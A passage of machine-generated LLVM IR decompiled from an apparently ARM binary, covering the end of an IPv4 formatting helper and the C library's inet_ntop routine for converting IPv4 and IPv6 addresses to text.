  store i32 %v2_1aefc, i32* %sb.global-to-local, align 4
  %v0_1af04 = load i32, i32* %r4.global-to-local, align 4
  %v2_1af0c = udiv i32 %v0_1af04, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1af14 = urem i32 %v2_1af0c, 256
  %v2_1af18 = urem i32 %v1_1af14, 10
  %v1_1af1c = or i32 %v2_1af18, 48
  %v1_1af20 = trunc i32 %v1_1af1c to i8
  br i1 %v7_1aef8, label %dec_label_pc_1af0c, label %dec_label_pc_1af34

dec_label_pc_1af0c:                               ; preds = %dec_label_pc_1aed4
  store i8 %v1_1af20, i8* %v2_1aef4, align 1
  %v0_1af24 = load i32, i32* %r5.global-to-local, align 4
  %v1_1af24 = add i32 %v0_1af24, -17
  %v2_1af24 = inttoptr i32 %v1_1af24 to i8*
  %v3_1af24 = load i8, i8* %v2_1af24, align 1
  %v7_1af28 = icmp eq i8 %v3_1af24, 48
  br i1 %v7_1af28, label %dec_label_pc_1af0c.dec_label_pc_1af58_crit_edge, label %bb

dec_label_pc_1af0c.dec_label_pc_1af58_crit_edge:  ; preds = %dec_label_pc_1af0c
  %v1_1af68.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1af58

bb:                                               ; preds = %dec_label_pc_1af0c
  %v1_1af2c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1af2c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1af58

dec_label_pc_1af34:                               ; preds = %dec_label_pc_1aed4
  %v2_1af50 = load i32, i32* %sl.global-to-local, align 4
  %v3_1af50 = add i32 %v2_1af50, -17
  %v4_1af50 = inttoptr i32 %v3_1af50 to i8*
  store i8 %v1_1af20, i8* %v4_1af50, align 1
  %v0_1af54 = load i32, i32* %r7.global-to-local, align 4
  %v1_1af54 = add i32 %v0_1af54, 1
  store i32 %v1_1af54, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1af58

dec_label_pc_1af58:                               ; preds = %dec_label_pc_1af0c.dec_label_pc_1af58_crit_edge, %bb, %dec_label_pc_1af34
  %v1_1af68 = phi i32 [ %v1_1af68.pre, %dec_label_pc_1af0c.dec_label_pc_1af58_crit_edge ], [ %v1_1af2c, %bb ], [ %v1_1af54, %dec_label_pc_1af34 ]
  %v0_1af58 = load i32, i32* %sb.global-to-local, align 4
  %v1_1af58 = inttoptr i32 %v0_1af58 to i8*
  %v2_1af58 = load i8, i8* %v1_1af58, align 1
  %tmp17 = urem i8 %v2_1af58, 10
  store i32 %v2_1af8c, i32* %ip.global-to-local, align 4
  %v1_1af6c = add i32 %v1_1af68, 1
  store i32 %v1_1af6c, i32* %r1.global-to-local, align 4
  %v1_1af70 = or i8 %tmp17, 48
  %v3_1af74 = add i32 %v2_1af68, %v1_1af68
  %v4_1af74 = inttoptr i32 %v3_1af74 to i8*
  store i8 %v1_1af70, i8* %v4_1af74, align 1
  %v0_1af78 = load i32, i32* %ip.global-to-local, align 4
  %v1_1af78 = load i32, i32* %r1.global-to-local, align 4
  %v2_1af78 = add i32 %v1_1af78, %v0_1af78
  store i32 %v2_1af78, i32* %r2.global-to-local, align 4
  %v3_1af80 = add i32 %v2_1af78, -17
  %v4_1af80 = inttoptr i32 %v3_1af80 to i8*
  store i8 46, i8* %v4_1af80, align 1
  %v0_1af84 = load i32, i32* %r8.global-to-local, align 4
  %v1_1af84 = add i32 %v0_1af84, 1
  store i32 %v1_1af84, i32* %r8.global-to-local, align 4
  %v0_1af88 = load i32, i32* %r1.global-to-local, align 4
  %v1_1af88 = add i32 %v0_1af88, 1
  br label %dec_label_pc_1af8c

dec_label_pc_1af8c:                               ; preds = %entry, %dec_label_pc_1af58
  %v0_1aed8 = phi i32 [ 0, %entry ], [ %v1_1af88, %dec_label_pc_1af58 ]
  %v1_1aed4 = phi i32 [ 0, %entry ], [ %v1_1af84, %dec_label_pc_1af58 ]
  store i32 %v2_1af8c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_1aed8, i32* %r6.global-to-local, align 4
  %v2_1af9c = add i32 %v0_1aed8, %v2_1af8c
  store i32 %v2_1af9c, i32* %r5.global-to-local, align 4
  %v7_1afa0 = icmp sgt i32 %v1_1aed4, 3
  br i1 %v7_1afa0, label %dec_label_pc_1afa4, label %dec_label_pc_1aed4

dec_label_pc_1afa4:                               ; preds = %dec_label_pc_1af8c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_1aeb0, i32* %r4.global-to-local, align 4
  %v3_1afac = add i32 %v2_1af9c, -18
  %v4_1afac = inttoptr i32 %v3_1afac to i8*
  store i8 0, i8* %v4_1afac, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_1afb4 = call i32 @strlen(i8* %tmp18)
  %v2_1afb8 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_1afb4, %v2_1afb8
  br i1 %tmp, label %dec_label_pc_1afc4, label %dec_label_pc_1afd8

dec_label_pc_1afc4:                               ; preds = %dec_label_pc_1afa4
  %v0_1afc4 = call i32 @__errno_location()
  %v0_1afcc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1afcc, i32* %r2.global-to-local, align 4
  %v2_1afd0 = inttoptr i32 %v0_1afc4 to i32*
  store i32 28, i32* %v2_1afd0, align 4
  %v0_1afe8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1afe8

dec_label_pc_1afd8:                               ; preds = %dec_label_pc_1afa4
  store i32 %v2_1aeb0, i32* %r1.global-to-local, align 4
  %v3_1afe0 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_1afe0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1afe8

dec_label_pc_1afe8:                               ; preds = %dec_label_pc_1afc4, %dec_label_pc_1afd8
  %v0_1afe8 = phi i32 [ %v0_1afe8.pre, %dec_label_pc_1afc4 ], [ %v3_1afe0, %dec_label_pc_1afd8 ]
  %v2_1aff0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1aff0, i32* @r4, align 4
  ret i32 %v0_1afe8

; uselistorder directives
  uselistorder i32 %v2_1af9c, { 0, 2, 1 }
  uselistorder i32 %v1_1aed4, { 1, 0 }
  uselistorder i32 %v0_1aed8, { 0, 2, 1 }
  uselistorder i32 %v2_1af8c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_1afe8, { 1, 0 }
  uselistorder label %dec_label_pc_1af8c, { 1, 0 }
  uselistorder label %dec_label_pc_1af58, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1aff8 = load i32, i32* @r4, align 4
  store i32 %v3_1aff8, i32* %stack_var_-32, align 4
  %v6_1aff8 = load i32, i32* @r5, align 4
  %v25_1aff8 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1affc = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1affc, label %dec_label_pc_1b020, label %dec_label_pc_1b014

dec_label_pc_1b014:                               ; preds = %entry
  %v7_1b014 = icmp eq i32 %arg1, 10
  br i1 %v7_1b014, label %dec_label_pc_1b034, label %dec_label_pc_1b234

dec_label_pc_1b020:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1b02c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1b22c

dec_label_pc_1b034:                               ; preds = %dec_label_pc_1b014
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1b040 = bitcast i32* %stack_var_-64 to i8*
  %v3_1b040 = call i32 @__GI_memset(i8* %v2_1b040, i32 0)
  br label %dec_label_pc_1b060

dec_label_pc_1b04c:                               ; preds = %dec_label_pc_1b060
  %tmp68 = icmp slt i32 %v1_1b050, 0
  %v4_1b060 = zext i1 %tmp68 to i32
  %v5_1b060 = add i32 %v4_1b060, %v1_1b050
  %v3_1b064 = sdiv i32 %v5_1b060, 2
  %v4_1b074 = mul i32 %v3_1b064, 4
  %v5_1b074 = add i32 %v4_1b074, %v25_1aff8
  %v1_1b04c = add i32 %v2_1b070, 1
  %v2_1b04c = inttoptr i32 %v1_1b04c to i8*
  %v3_1b04c = load i8, i8* %v2_1b04c, align 1
  %v4_1b04c = zext i8 %v3_1b04c to i32
  %v3_1b050 = inttoptr i32 %v2_1b070 to i8*
  %v4_1b050 = load i8, i8* %v3_1b050, align 1
  %v6_1b050 = zext i8 %v4_1b050 to i32
  store i32 %v6_1b050, i32* %r2.global-to-local, align 4
  %v4_1b054 = mul nuw nsw i32 %v6_1b050, 256
  %v5_1b054 = or i32 %v4_1b054, %v4_1b04c
  %v2_1b058 = add i32 %v5_1b074, -32
  %v3_1b058 = inttoptr i32 %v2_1b058 to i32*
  store i32 %v5_1b054, i32* %v3_1b058, align 4
  %v0_1b05c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b05c = add i32 %v0_1b05c, 2
  br label %dec_label_pc_1b060

dec_label_pc_1b060:                               ; preds = %dec_label_pc_1b034, %dec_label_pc_1b04c
  %v1_1b050 = phi i32 [ 0, %dec_label_pc_1b034 ], [ %v1_1b05c, %dec_label_pc_1b04c ]
  store i32 %v1_1b050, i32* %r1.global-to-local, align 4
  %v0_1b070 = load i32, i32* @r8, align 4
  %v2_1b070 = add i32 %v0_1b070, %v1_1b050
  store i32 %v2_1b070, i32* %r2.global-to-local, align 4
  %v7_1b078 = icmp sgt i32 %v1_1b050, 15
  br i1 %v7_1b078, label %dec_label_pc_1b07c, label %dec_label_pc_1b04c

dec_label_pc_1b07c:                               ; preds = %dec_label_pc_1b060
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b08c

dec_label_pc_1b08c:                               ; preds = %dec_label_pc_1b07c, %dec_label_pc_1b0d8
  %v0_1b0cc = phi i32 [ -1, %dec_label_pc_1b07c ], [ %v0_1b100, %dec_label_pc_1b0d8 ]
  %v0_1b0bc = phi i32 [ -1, %dec_label_pc_1b07c ], [ %v0_1b0ec, %dec_label_pc_1b0d8 ]
  %v0_1b0a0 = phi i32 [ -1, %dec_label_pc_1b07c ], [ %v0_1b0a08, %dec_label_pc_1b0d8 ]
  %v0_1b0d8 = phi i32 [ 0, %dec_label_pc_1b07c ], [ %v1_1b0d8, %dec_label_pc_1b0d8 ]
  %v4_1b090 = mul nuw nsw i32 %v0_1b0d8, 4
  %v5_1b090 = add i32 %v4_1b090, %v25_1aff8
  %v1_1b094 = add i32 %v5_1b090, -32
  %v2_1b094 = inttoptr i32 %v1_1b094 to i32*
  %v3_1b094 = load i32, i32* %v2_1b094, align 4
  %v2_1b098 = icmp eq i32 %v3_1b094, 0
  %v7_1b0a0 = icmp eq i32 %v0_1b0a0, -1
  br i1 %v2_1b098, label %dec_label_pc_1b0a0, label %dec_label_pc_1b0b4

dec_label_pc_1b0a0:                               ; preds = %dec_label_pc_1b08c
  br i1 %v7_1b0a0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b0a0
  store i32 %v0_1b0d8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1b0d8

.thread:                                          ; preds = %dec_label_pc_1b0a0
  %v1_1b0ac.pre = load i32, i32* @r4, align 4
  %v2_1b0ac = add i32 %v1_1b0ac.pre, 1
  store i32 %v2_1b0ac, i32* @r4, align 4
  br label %dec_label_pc_1b0d8

dec_label_pc_1b0b4:                               ; preds = %dec_label_pc_1b08c
  br i1 %v7_1b0a0, label %dec_label_pc_1b0d8, label %dec_label_pc_1b0bc

dec_label_pc_1b0bc:                               ; preds = %dec_label_pc_1b0b4
  %v7_1b0bc = icmp eq i32 %v0_1b0bc, -1
  %v0_1b0d0.pre = load i32, i32* @r4, align 4
  %v1_1b0c4 = load i32, i32* @r7, align 4
  %v7_1b0c8 = icmp sgt i32 %v0_1b0d0.pre, %v1_1b0c4
  %or.cond = or i1 %v7_1b0bc, %v7_1b0c8
  br i1 %or.cond, label %dec_label_pc_1b0cc, label %dec_label_pc_1b0d4

dec_label_pc_1b0cc:                               ; preds = %dec_label_pc_1b0bc
  store i32 %v0_1b0cc, i32* @r6, align 4
  store i32 %v0_1b0d0.pre, i32* @r7, align 4
  br label %dec_label_pc_1b0d4

dec_label_pc_1b0d4:                               ; preds = %dec_label_pc_1b0bc, %dec_label_pc_1b0cc
  %v0_1b0bc13 = phi i32 [ %v0_1b0cc, %dec_label_pc_1b0cc ], [ %v0_1b0bc, %dec_label_pc_1b0bc ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b0d8

dec_label_pc_1b0d8:                               ; preds = %bb, %.thread, %dec_label_pc_1b0b4, %dec_label_pc_1b0d4
  %v0_1b100 = phi i32 [ %v0_1b0cc, %.thread ], [ %v0_1b0d8, %bb ], [ %v0_1b0cc, %dec_label_pc_1b0b4 ], [ -1, %dec_label_pc_1b0d4 ]
  %v0_1b0a08 = phi i32 [ %v0_1b0a0, %.thread ], [ %v0_1b0d8, %bb ], [ -1, %dec_label_pc_1b0b4 ], [ -1, %dec_label_pc_1b0d4 ]
  %v0_1b0ec = phi i32 [ %v0_1b0bc, %.thread ], [ %v0_1b0bc, %bb ], [ %v0_1b0bc, %dec_label_pc_1b0b4 ], [ %v0_1b0bc13, %dec_label_pc_1b0d4 ]
  %v1_1b0d8 = add nuw nsw i32 %v0_1b0d8, 1
  store i32 %v1_1b0d8, i32* %r1.global-to-local, align 4
  %v7_1b0e0 = icmp slt i32 %v1_1b0d8, 8
  br i1 %v7_1b0e0, label %dec_label_pc_1b08c, label %dec_label_pc_1b0e4

dec_label_pc_1b0e4:                               ; preds = %dec_label_pc_1b0d8
  %v7_1b0e4 = icmp eq i32 %v0_1b100, -1
  br i1 %v7_1b0e4, label %dec_label_pc_1b104, label %dec_label_pc_1b0ec

dec_label_pc_1b0ec:                               ; preds = %dec_label_pc_1b0e4
  %v7_1b0ec = icmp eq i32 %v0_1b0ec, -1
  %v0_1b0fc.pre = load i32, i32* @r4, align 4
  br i1 %v7_1b0ec, label %dec_label_pc_1b0fc, label %dec_label_pc_1b0f4

dec_label_pc_1b0f4:                               ; preds = %dec_label_pc_1b0ec
  %v1_1b0f4 = load i32, i32* @r7, align 4
  %v7_1b0f8 = icmp sgt i32 %v0_1b0fc.pre, %v1_1b0f4
  br i1 %v7_1b0f8, label %dec_label_pc_1b0fc, label %dec_label_pc_1b104

dec_label_pc_1b0fc:                               ; preds = %dec_label_pc_1b0ec, %dec_label_pc_1b0f4
  store i32 %v0_1b0fc.pre, i32* @r7, align 4
  store i32 %v0_1b100, i32* @r6, align 4
  br label %dec_label_pc_1b104

dec_label_pc_1b104:                               ; preds = %dec_label_pc_1b0f4, %dec_label_pc_1b0e4, %dec_label_pc_1b0fc
  %v0_1b104 = phi i32 [ %v0_1b0ec, %dec_label_pc_1b0f4 ], [ %v0_1b0ec, %dec_label_pc_1b0e4 ], [ %v0_1b100, %dec_label_pc_1b0fc ]
  %v7_1b104 = icmp eq i32 %v0_1b104, -1
  br i1 %v7_1b104, label %bb49, label %dec_label_pc_1b10c

dec_label_pc_1b10c:                               ; preds = %dec_label_pc_1b104
  %v0_1b10c = load i32, i32* @r7, align 4
  %v7_1b110 = icmp slt i32 %v0_1b10c, 2
  br i1 %v7_1b110, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_1b10c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1b104, %dec_label_pc_1b10c, %bb48
  %v0_1b12023 = phi i32 [ %v0_1b104, %dec_label_pc_1b104 ], [ %v0_1b104, %dec_label_pc_1b10c ], [ -1, %bb48 ]
  %v2_1b114 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_1b114, i32* @r4, align 4
  %v9_1b180 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1b12063 = icmp eq i32 %v0_1b12023, -1
  br label %dec_label_pc_1b120

dec_label_pc_1b120:                               ; preds = %bb49, %dec_label_pc_1b1d4
  %v7_1b12067 = phi i1 [ %v7_1b12063, %bb49 ], [ %v7_1b120, %dec_label_pc_1b1d4 ]
  %v0_1b14c66 = phi i32 [ 0, %bb49 ], [ %v1_1b1d4, %dec_label_pc_1b1d4 ]
  %v1_1b13c65 = phi i32 [ %v0_1b12023, %bb49 ], [ %v0_1b120.pre, %dec_label_pc_1b1d4 ]
  %v3_1b15464 = phi i32 [ %v2_1b114, %bb49 ], [ %v3_1b14424, %dec_label_pc_1b1d4 ]
  br i1 %v7_1b12067, label %dec_label_pc_1b14c, label %dec_label_pc_1b128

dec_label_pc_1b128:                               ; preds = %dec_label_pc_1b120
  %v9_1b128 = icmp eq i32 %v0_1b14c66, %v1_1b13c65
  %v5_1b12c = icmp slt i32 %v0_1b14c66, %v1_1b13c65
  br i1 %v5_1b12c, label %dec_label_pc_1b14c, label %dec_label_pc_1b130

dec_label_pc_1b130:                               ; preds = %dec_label_pc_1b128
  %v1_1b130 = load i32, i32* @r7, align 4
  %v2_1b130 = add i32 %v1_1b130, %v1_1b13c65
  %v6_1b138 = icmp slt i32 %v0_1b14c66, %v2_1b130
  br i1 %v6_1b138, label %dec_label_pc_1b13c, label %dec_label_pc_1b14c

dec_label_pc_1b13c:                               ; preds = %dec_label_pc_1b130
  br i1 %v9_1b128, label %bb51, label %dec_label_pc_1b1d4

bb51:                                             ; preds = %dec_label_pc_1b13c
  %v4_1b144 = inttoptr i32 %v3_1b15464 to i8*
  store i8 58, i8* %v4_1b144, align 1
  %v5_1b144 = load i32, i32* @r4, align 4
  %v6_1b144 = add i32 %v5_1b144, 1
  store i32 %v6_1b144, i32* @r4, align 4
  br label %dec_label_pc_1b1d4

dec_label_pc_1b14c:                               ; preds = %dec_label_pc_1b130, %dec_label_pc_1b128, %dec_label_pc_1b120
  %v2_1b14c = icmp eq i32 %v0_1b14c66, 0
  br i1 %v2_1b14c, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_1b14c
  %v4_1b154 = inttoptr i32 %v3_1b15464 to i8*
  store i8 58, i8* %v4_1b154, align 1
  %v5_1b154 = load i32, i32* @r4, align 4
  %v6_1b154 = add i32 %v5_1b154, 1
  store i32 %v6_1b154, i32* @r4, align 4
  %v0_1b158.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1b14c, %bb52
  %v0_1b198 = phi i32 [ %v3_1b15464, %dec_label_pc_1b14c ], [ %v6_1b154, %bb52 ]
  %v1_1b1bc = phi i32 [ 0, %dec_label_pc_1b14c ], [ %v0_1b158.pre, %bb52 ]
  %v7_1b158 = icmp eq i32 %v1_1b1bc, 6
  br i1 %v7_1b158, label %dec_label_pc_1b160, label %dec_label_pc_1b1b8

dec_label_pc_1b160:                               ; preds = %.thread3
  %v0_1b160 = load i32, i32* @r6, align 4
  %v2_1b160 = icmp eq i32 %v0_1b160, 0
  br i1 %v2_1b160, label %dec_label_pc_1b168, label %dec_label_pc_1b1b8

dec_label_pc_1b168:                               ; preds = %dec_label_pc_1b160
  %v0_1b168 = load i32, i32* @r7, align 4
  %v7_1b168 = icmp eq i32 %v0_1b168, 6
  br i1 %v7_1b168, label %dec_label_pc_1b188, label %dec_label_pc_1b170

dec_label_pc_1b170:                               ; preds = %dec_label_pc_1b168
  %v7_1b170 = icmp eq i32 %v0_1b168, 5
  br i1 %v7_1b170, label %dec_label_pc_1b178, label %dec_label_pc_1b1b8

dec_label_pc_1b178:                               ; preds = %dec_label_pc_1b170
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_1b180, label %dec_label_pc_1b188, label %dec_label_pc_1b1b8

dec_label_pc_1b188:                               ; preds = %dec_label_pc_1b178, %dec_label_pc_1b168
  %v2_1b18c = sub i32 %v25_1aff8, %v0_1b198
  %v0_1b190 = load i32, i32* @r8, align 4
  %v1_1b190 = add i32 %v0_1b190, 12
  %v1_1b194 = add i32 %v2_1b18c, -32
  store i32 %v1_1b194, i32* %r2.global-to-local, align 4
  store i32 %v0_1b198, i32* %r1.global-to-local, align 4
  %v3_1b19c = call i32 @inet_ntop4(i32 %v1_1b190, i32 %v0_1b198, i32 %v1_1b194)
  %v2_1b1a0 = icmp eq i32 %v3_1b19c, 0
  br i1 %v2_1b1a0, label %dec_label_pc_1b22c, label %dec_label_pc_1b1a8

dec_label_pc_1b1a8:                               ; preds = %dec_label_pc_1b188
  %v0_1b1a8 = load i32, i32* @r4, align 4
  %v1_1b1a8 = inttoptr i32 %v0_1b1a8 to i8*
  %v3_1b1ac = call i32 @strlen(i8* %v1_1b1a8)
  %v0_1b1b0 = load i32, i32* @r4, align 4
  %v2_1b1b0 = add i32 %v0_1b1b0, %v3_1b1ac
  store i32 %v2_1b1b0, i32* @r4, align 4
  %v0_1b1e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1b1e8

dec_label_pc_1b1b8:                               ; preds = %dec_label_pc_1b178, %dec_label_pc_1b170, %dec_label_pc_1b160, %.thread3
  %v4_1b1bc = mul i32 %v1_1b1bc, 4
  %v5_1b1bc = add i32 %v4_1b1bc, %v25_1aff8
  store i32 %v0_1b198, i32* @r0, align 4
  %v1_1b1c4 = add i32 %v5_1b1bc, -32
  %v2_1b1c4 = inttoptr i32 %v1_1b1c4 to i32*
  %v3_1b1c4 = load i32, i32* %v2_1b1c4, align 4
  store i32 %v3_1b1c4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_2304c.1675 to i32), i32* %r1.global-to-local, align 4
  %v3_1b1cc = call i32 @sprintf(i32 %v0_1b198, i32 ptrtoint ([3 x i8]* @global_var_2304c.1675 to i32))
  %v0_1b1d0 = load i32, i32* @r4, align 4
  %v2_1b1d0 = add i32 %v0_1b1d0, %v3_1b1cc
  store i32 %v2_1b1d0, i32* @r4, align 4
  br label %dec_label_pc_1b1d4

dec_label_pc_1b1d4:                               ; preds = %dec_label_pc_1b13c, %bb51, %dec_label_pc_1b1b8
  %v3_1b14424 = phi i32 [ %v3_1b15464, %dec_label_pc_1b13c ], [ %v6_1b144, %bb51 ], [ %v2_1b1d0, %dec_label_pc_1b1b8 ]
  %v0_1b1d4 = load i32, i32* @r5, align 4
  %v1_1b1d4 = add i32 %v0_1b1d4, 1
  %v0_1b120.pre = load i32, i32* @r6, align 4
  store i32 %v1_1b1d4, i32* @r5, align 4
  %v7_1b1dc = icmp slt i32 %v1_1b1d4, 8
  %v7_1b120 = icmp eq i32 %v0_1b120.pre, -1
  br i1 %v7_1b1dc, label %dec_label_pc_1b120, label %dec_label_pc_1b1e0

dec_label_pc_1b1e0:                               ; preds = %dec_label_pc_1b1d4
  br i1 %v7_1b120, label %.thread4, label %dec_label_pc_1b1e8

dec_label_pc_1b1e8:                               ; preds = %dec_label_pc_1b1e0, %dec_label_pc_1b1a8
  %v3_1b1f4 = phi i32 [ %v3_1b14424, %dec_label_pc_1b1e0 ], [ %v2_1b1b0, %dec_label_pc_1b1a8 ]
  %v0_1b1e8 = phi i32 [ %v0_1b120.pre, %dec_label_pc_1b1e0 ], [ %v0_1b1e8.pre, %dec_label_pc_1b1a8 ]
  %v1_1b1e8 = load i32, i32* @r7, align 4
  %v2_1b1e8 = add i32 %v1_1b1e8, %v0_1b1e8
  %v7_1b1ec = icmp eq i32 %v2_1b1e8, 8
  br i1 %v7_1b1ec, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_1b1e8
  %v4_1b1f4 = inttoptr i32 %v3_1b1f4 to i8*
  store i8 58, i8* %v4_1b1f4, align 1
  %v5_1b1f4 = load i32, i32* @r4, align 4
  %v6_1b1f4 = add i32 %v5_1b1f4, 1
  store i32 %v6_1b1f4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1b1e8, %dec_label_pc_1b1e0, %bb53
  %v2_1b1fc = phi i32 [ %v3_1b1f4, %dec_label_pc_1b1e8 ], [ %v3_1b14424, %dec_label_pc_1b1e0 ], [ %v6_1b1f4, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1b1fc = inttoptr i32 %v2_1b1fc to i8*
  store i8 0, i8* %v3_1b1fc, align 1
  %v4_1b1fc = load i32, i32* @r4, align 4
  %v5_1b1fc = add i32 %v4_1b1fc, 1
  store i32 %v2_1b114, i32* %r1.global-to-local, align 4
  %v2_1b204 = sub i32 %v5_1b1fc, %v2_1b114
  %v1_1b208 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_1b204, %v1_1b208
  br i1 %tmp69, label %dec_label_pc_1b210, label %dec_label_pc_1b224

dec_label_pc_1b210:                               ; preds = %.thread4
  %v0_1b210 = call i32 @__errno_location()
  %v0_1b218 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1b218, i32* %r2.global-to-local, align 4
  %v2_1b21c = inttoptr i32 %v0_1b210 to i32*
  store i32 28, i32* %v2_1b21c, align 4
  %v0_1b244.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b244

dec_label_pc_1b224:                               ; preds = %.thread4
  %v0_1b224 = load i32, i32* @sb, align 4
  %v2_1b228 = bitcast i32* %stack_var_-110 to i8*
  %v3_1b228 = call i32 @strcpy(i32 %v0_1b224, i8* %v2_1b228)
  br label %dec_label_pc_1b22c

dec_label_pc_1b22c:                               ; preds = %dec_label_pc_1b188, %dec_label_pc_1b020, %dec_label_pc_1b224
  %v0_1b22c = phi i32 [ 0, %dec_label_pc_1b188 ], [ %v3_1b02c, %dec_label_pc_1b020 ], [ %v3_1b228, %dec_label_pc_1b224 ]
  store i32 %v0_1b22c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b244

dec_label_pc_1b234:                               ; preds = %dec_label_pc_1b014
  %v0_1b234 = call i32 @__errno_location()
  %v2_1b23c = inttoptr i32 %v0_1b234 to i32*
  store i32 97, i32* %v2_1b23c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b244

dec_label_pc_1b244:                               ; preds = %dec_label_pc_1b22c, %dec_label_pc_1b210, %dec_label_pc_1b234
  %v0_1b244 = phi i32 [ %v0_1b22c, %dec_label_pc_1b22c ], [ %v0_1b244.pre, %dec_label_pc_1b210 ], [ 0, %dec_label_pc_1b234 ]
  store i32 %v6_1aff8, i32* %r5.global-to-local, align 4
  ret i32 %v0_1b244

; uselistorder directives
  uselistorder i1 %v7_1b120, { 1, 0 }
  uselistorder i32 %v0_1b120.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1b1d4, { 1, 0, 2 }
  uselistorder i32 %v0_1b198, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1b15464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1b13c65, { 2, 0, 1 }
  uselistorder i32 %v0_1b14c66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_1b114, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1b12023, { 1, 0 }
  uselistorder i32 %v0_1b104, { 1, 2, 0 }
  uselistorder i32 %v1_1b0d8, { 1, 2, 0 }
  uselistorder i32 %v0_1b0ec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1b100, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1b0a0, { 1, 0 }
  uselistorder i32 %v0_1b0d8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1b0bc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1b0cc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1b070, { 2, 1, 0 }
  uselistorder i32 %v1_1b050, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_1aff8, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 5, 6, 9, 0, 1, 10, 7, 8, 2, 3, 4 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 6, 0 }
